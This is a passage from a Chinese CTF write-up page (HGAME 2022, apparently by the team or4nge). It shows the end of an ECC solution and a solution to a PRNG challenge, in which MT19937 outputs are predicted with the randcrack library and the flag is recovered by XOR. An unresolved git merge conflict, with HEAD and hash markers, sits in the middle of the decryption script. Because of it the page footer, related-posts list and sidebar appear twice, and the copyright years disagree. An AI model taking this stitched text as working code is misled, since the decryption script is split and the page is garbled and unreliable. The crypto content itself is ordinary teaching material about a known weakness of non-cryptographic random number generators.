flag <span style="color:#f92672">=</span> n2s(pow(cipher_left<span style="color:#f92672">*</span>d1,<span style="color:#ae81ff">1</span>,p)) <span style="color:#f92672">+</span> n2s(pow(cipher_right<span style="color:#f92672">*</span>d2,<span style="color:#ae81ff">1</span>,p))
print(flag)
<span style="color:#75715e"># &#34;hgame{ECC$is!sO@HaRd}&#34;</span>
</code></pre></div><h3 id="cryptoprng">[Crypto]PRNG</h3>
<blockquote>
<p>By NULLPointer</p>
</blockquote>
<p>解压得到 output.txt 和 task.py，先分析加密代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">mt <span style="color:#f92672">=</span> PRNG(randrange(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span>)) <span style="color:#75715e"># 在0到2^32-1之间建立伪随机数生成器</span>
print([mt() <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">624</span>)]) <span style="color:#75715e"># 利用伪随机数生成器生成624个伪随机数写入列表</span>
print([part <span style="color:#f92672">^</span> mt() <span style="color:#66d9ef">for</span> part <span style="color:#f92672">in</span> map(s2n, re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;.{1,4}&#34;</span>, flag))]) <span style="color:#75715e"># 将flag每四个字符分成一组得到多组字符串，转成整数后对每一组字符串生成一个伪随机数并异或处理，写入列表</span>
</code></pre></div><p>由 MT 和 624 等关键词可知考察的是 PRNG 中的伪随机数生成算法 MT19937。MT19937 是一种周期很长的的伪随机数生成算法，可以快速的产生高质量的伪随机数。然而，由于 MT 中伪随机数是由固定的种子数生成的，因此如果获得了算法中种子数的统计规律，便可以利用其规律和已知的伪随机数序列推测算法生成的下一个伪随机数。在 MT 算法中，一般得到 624 个伪随机数即可进行预测。</p>
<p>github 上基于 python 的开源工具 rankcrack 可以预测伪随机数序列。利用该工具编写预测脚本如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> randcrack <span style="color:#f92672">import</span> RandCrack

<span style="color:#75715e"># data = [...] 题目中已给出</span>
Rand <span style="color:#f92672">=</span> RandCrack()
<span style="color:#66d9ef">assert</span>(len(data) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">624</span>)
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">624</span>):
    Rand<span style="color:#f92672">.</span>submit(data[i])
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">624</span>, len(data)):
    Rand<span style="color:#f92672">.</span>predict_randrange(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xffffffff</span>)
print(Rand<span style="color:#f92672">.</span>predict_randrange(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xffffffff</span>))
</code></pre></div><p>脚本的使用方法为：将已知的伪随机数序列 data 放入程序，程序会根据已知序列预测MT算法产生的下一个伪随机数。将预测得到的伪随机数放入 data 末尾，重新运行程序即可获得下一个伪随机数。重复执行以上步骤直至获得足够长的伪随机数序列。</p>
<p>密文列表中共有 21 个元素，因此利用以上预测脚本预测接下来生成的 21 个伪随机数。最后将对应位置的密文和伪随机数异或即可得到明文。解密脚本如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">data <span style="color:#f92672">=</span> [
    <span style="color:#ae81ff">888058162</span>, <span style="color:#ae81ff">3094055443</span>,
    <span style="color:#75715e"># 中间省略</span>
    <span style="color:#ae81ff">1699850772</span>, <span style="color:#ae81ff">1444384326</span>
]
c <span style="color:#f92672">=</span> [
    <span style="color:#ae81ff">3437104340</span>, <span style="color:#ae81ff">508103176</span>, <span style="color:#ae81ff">1635844121</span>, <span style="color:#ae81ff">878522509</span>, <span style="color:#ae81ff">1923790547</span>, <span style="color:#ae81ff">1727955782</span>,
    <span style="color:#ae81ff">1371509208</span>, <span style="color:#ae81ff">3182873539</span>, <span style="color:#ae81ff">156878129</span>, <span style="color:#ae81ff">1757777801</span>, <span style="color:#ae81ff">1472806960</span>, <span style="color:#ae81ff">3486450735</span>,
    <span style="color:#ae81ff">2307527058</span>, <span style="color:#ae81ff">2950814692</span>, <span style="color:#ae81ff">1817110380</span>, <span style="color:#ae81ff">372493821</span>, <span style="color:#ae81ff">729662950</span>, <span style="color:#ae81ff">2366747255</span>, 
    <span style="color:#ae81ff">774823385</span>, <span style="color:#ae81ff">387513980</span>, <span style="color:#ae81ff">1444397883</span>
]

<<<<<<< HEAD

    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/ctf/">CTF</a>
        
            <a href="/tags/writeup/">Writeup</a>
        
            <a href="/tags/web/">Web</a>
        
            <a href="/tags/pwn/">Pwn</a>
        
            <a href="/tags/reverse/">Reverse</a>
        
            <a href="/tags/crypto/">Crypto</a>
        
            <a href="/tags/misc/">Misc</a>
        
            <a href="/tags/hgame/">HGAME</a>
        
    </section>


    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            Last updated on Mar 01, 2022 22:03 CST
        </span>
    </section></footer>


    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="has-image">
    <a href="/post/cazy-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/cazy-writeup-by-or4nge/cover.b7dbd864c0b986f185463e4e1e361913_hu2ef483a7301ed58558e75f3e1747bee2_206467_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-t9vYZMC5hvGFRj5OHjYZEw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">长安战“疫” Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/dnuictf-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams.a2ec5f685d98dbff218d75d526fbc61d_hu9bd851d71a6520395d404c81ac536fbe_87588_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-ouxfaF2Y2/8hjXXVJvvGHQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">2021暗泉杯 Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/bluehat-final-writeup/">
        
        

        <div class="article-details">
            <h2 class="article-title">2021蓝帽杯决赛 Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/hws2022-writeup/">
        
        
            <div class="article-image">
                <img src="/post/hws2022-writeup/cover.f811fdb681235510573ab73e97dd00ae_hu31039705144761defd1e1848d4287a81_131160_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-&#43;BH9toEjVRBXOrc&#43;l90Arg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HWS2022冬令营预选赛 Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/kctf2021-fall-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/kctf2021-fall-writeup-by-or4nge/cover.d3f800bd94671a07795ef31abe675705_hufd6827b5e92508a15177056d76ff05d4_2462797_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-0/gAvZRnGgd5XvMavmdXBQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">KCTF2021 Fall Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2023 or4nge
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">Table of contents</h2>
                
                <div class="widget--toc">
=======
<span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> n2s
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">624</span>,<span style="color:#ae81ff">646</span>):
    print(n2s(c[i<span style="color:#f92672">-</span><span style="color:#ae81ff">624</span>]<span style="color:#f92672">^</span>data[i]))
<span style="color:#75715e"># hgame{meRsenne!tWisTER~iS^A*WIDelY-USEd^pSEUDo&amp;rAndOM:nUmBEr!GeNErATIon?AlgorIThM}</span>
</code></pre></div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/ctf/">CTF</a>
        
            <a href="/tags/writeup/">Writeup</a>
        
            <a href="/tags/web/">Web</a>
        
            <a href="/tags/pwn/">Pwn</a>
        
            <a href="/tags/reverse/">Reverse</a>
        
            <a href="/tags/crypto/">Crypto</a>
        
            <a href="/tags/misc/">Misc</a>
        
            <a href="/tags/hgame/">HGAME</a>
        
    </section>


    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            Last updated on Mar 01, 2022 22:03 CST
        </span>
    </section></footer>


    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="has-image">
    <a href="/post/cazy-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/cazy-writeup-by-or4nge/cover.b7dbd864c0b986f185463e4e1e361913_hu2ef483a7301ed58558e75f3e1747bee2_206467_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-t9vYZMC5hvGFRj5OHjYZEw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">长安战“疫” Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/dnuictf-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams.a2ec5f685d98dbff218d75d526fbc61d_hu9bd851d71a6520395d404c81ac536fbe_87588_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-ouxfaF2Y2/8hjXXVJvvGHQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">2021暗泉杯 Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/bluehat-final-writeup/">
        
        

        <div class="article-details">
            <h2 class="article-title">2021蓝帽杯决赛 Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/hws2022-writeup/">
        
        
            <div class="article-image">
                <img src="/post/hws2022-writeup/cover.f811fdb681235510573ab73e97dd00ae_hu31039705144761defd1e1848d4287a81_131160_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-&#43;BH9toEjVRBXOrc&#43;l90Arg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HWS2022冬令营预选赛 Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/kctf2021-fall-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/kctf2021-fall-writeup-by-or4nge/cover.d3f800bd94671a07795ef31abe675705_hufd6827b5e92508a15177056d76ff05d4_2462797_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-0/gAvZRnGgd5XvMavmdXBQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">KCTF2021 Fall Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2022 or4nge
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">Table of contents</h2>
                
                <div class="widget--toc">
>>>>>>> 0b781f88c4081f7a9d007cfd2302254a37f661ad
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#week1">week1</a>
      <ul>
        <li><a href="#webfujiwara-tofu-shop">[Web]Fujiwara Tofu Shop</a></li>
        <li><a href="#webtetris-plus">[Web]Tetris plus</a></li>
        <li><a href="#web蛛蛛嘿嘿我的蛛蛛">[Web]蛛蛛&hellip;嘿嘿♥我的蛛蛛</a></li>
        <li><a href="#webeasy_auth">[Web]easy_auth</a></li>
        <li><a href="#pwngdb">[Pwn]gdb</a></li>
        <li><a href="#pwnenter_the_pwn_land">[Pwn]enter_the_pwn_land</a></li>
        <li><a href="#pwnenter_the_evil_pwn_land">[Pwn]enter_the_evil_pwn_land</a></li>
        <li><a href="#pwnoldfashion_orw">[Pwn]oldfashion_orw</a></li>
        <li><a href="#reeasyasm">[RE]easyasm</a></li>
        <li><a href="#recreakme">[RE]creakme</a></li>
        <li><a href="#reflag-checker">[RE]Flag Checker</a></li>
        <li><a href="#re猫头鹰是不是猫">[RE]猫头鹰是不是猫</a></li>
        <li><a href="#cryptodancing-line">[Crypto]Dancing Line</a></li>
        <li><a href="#cryptomatryohska">[Crypto]Matryohska</a></li>
        <li><a href="#cryptoeasy-rsa">[Crypto]Easy RSA</a></li>
        <li><a href="#cryptoenglish-novel">[Crypto]English Novel</a></li>
        <li><a href="#misc这个压缩包有点麻烦">[Misc]这个压缩包有点麻烦</a></li>
        <li><a href="#misc好康的流量">[Misc]好康的流量</a></li>
        <li><a href="#misc群青其实是幽灵东京">[Misc]群青(其实是幽灵东京)</a></li>
        <li><a href="#iot饭卡的-uno">[IOT]饭卡的 uno</a></li>
      </ul>
    </li>
    <li><a href="#week2">week2</a>
      <ul>
        <li><a href="#webwebpack-engine">[Web]webpack-engine</a></li>
        <li><a href="#webapache">[Web]Apache!</a></li>
        <li><a href="#web一本单词书">[Web]一本单词书</a></li>
        <li><a href="#webpokemon">[Web]Pokemon</a></li>
        <li><a href="#webat0m的留言板">[Web]At0m的留言板</a></li>
        <li><a href="#pwnblind">[Pwn]blind</a></li>
        <li><a href="#pwnecho-sever">[Pwn]echo sever</a></li>
        <li><a href="#pwnoldfashion_note">[Pwn]oldfashion_note</a></li>
        <li><a href="#rexd-maze">[RE]xD MAZE</a></li>
        <li><a href="#refakeshell">[RE]fakeshell</a></li>
        <li><a href="#recreakme2">[RE]creakme2</a></li>
        <li><a href="#reupx-magic-0">[RE]upx magic 0</a></li>
        <li><a href="#reupx-magic-1">[RE]upx magic 1</a></li>
        <li><a href="#cryptochinese-character-encryption">[Crypto]Chinese Character Encryption</a></li>
        <li><a href="#cryptorsa-attack">[Crypto]RSA Attack</a></li>
        <li><a href="#cryptorsa-attack-2">[Crypto]RSA Attack 2</a></li>
        <li><a href="#cryptothe-password-plus-pro-max-ultra">[Crypto]The Password Plus Pro Max Ultra</a></li>
      </ul>
    </li>
    <li><a href="#week3">week3</a>
      <ul>
        <li><a href="#webloginme">[Web]LoginMe</a></li>
        <li><a href="#websecuritycenter">[Web]SecurityCenter</a></li>
        <li><a href="#webvidar-shop-demo">[Web]Vidar shop demo</a></li>
        <li><a href="#pwnelder_note">[Pwn]elder_note</a></li>
        <li><a href="#pwnchangeable_note">[Pwn]changeable_note</a></li>
        <li><a href="#pwnsized_note">[Pwn]sized_note</a></li>
        <li><a href="#reanswers-windows">[RE]Answer&rsquo;s windows</a></li>
        <li><a href="#recreakme_3">[RE]creakme_3</a></li>
        <li><a href="#refishman">[RE]fishman</a></li>
        <li><a href="#cryptoblock-cipher">[Crypto]Block Cipher</a></li>
        <li><a href="#cryptomulti-prime-rsa">[Crypto]Multi Prime RSA</a></li>
        <li><a href="#cryptorsa-attack-3">[Crypto]RSA Attack 3</a></li>
        <li><a href="#misc卡中毒">[Misc]卡中毒</a></li>
      </ul>
    </li>
    <li><a href="#week4">week4</a>
      <ul>
        <li><a href="#webcomment">[Web]Comment</a></li>
        <li><a href="#webfilesystem">[Web]FileSystem</a></li>
        <li><a href="#pwnvector">[Pwn]vector</a></li>
        <li><a href="#rewow">[RE]WOW</a></li>
        <li><a href="#reserver">[RE]server</a></li>
        <li><a href="#reezvm">[RE]ezvm</a></li>
        <li><a href="#rehardasm">[RE]hardasm</a></li>
        <li><a href="#cryptoecc">[Crypto]ECC</a></li>
        <li><a href="#cryptoprng">[Crypto]PRNG</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
